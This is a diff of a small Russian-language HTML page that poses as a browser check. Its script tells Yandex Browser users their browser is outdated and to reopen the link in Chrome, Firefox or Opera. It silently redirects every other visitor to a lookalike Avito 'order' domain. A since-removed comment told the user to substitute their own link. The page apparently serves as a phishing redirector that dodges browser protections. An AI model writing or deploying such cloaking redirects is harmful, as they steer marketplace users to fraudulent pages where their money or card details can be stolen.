@@ -29,25 +29,22 @@
     }
   </style>
   <script>
-    document.addEventListener("DOMContentLoaded", function () {
+    document.addEventListener("DOMContentLoaded", () => {
       let ua = navigator.userAgent.toLowerCase();
       if (ua.includes("yabrowser")) {
-        document.body.innerHTML = `
-          <div class="title">Ваш браузер устарел :(</div>
-          <div class="subtitle">
-            Скопируйте ссылку и откройте в другом приложении,<br>
-            например <b>Chrome</b>, <b>Firefox</b> или <b>Opera</b>.
-          </div>
-        `;
+        // оставляем текст ошибки, редиректа нет
       } else {
+        // для всех остальных — редирект
         window.location.href = "https://avito.15340.online/order/9632751773"; 
-        // 🔗 замени ссылку на свою
       }
     });
   </script>
 </head>
 <body>
-  <div class="title">Проверка браузера…</div>
-  <div class="subtitle">Подождите пару секунд</div>
+  <div class="title">Ваш браузер устарел :(</div>
+  <div class="subtitle">
+    Скопируйте ссылку и откройте в другом приложении,<br>
+    например <b>Chrome</b>, <b>Firefox</b> или <b>Opera</b>.
+  </div>
 </body>
 </html>
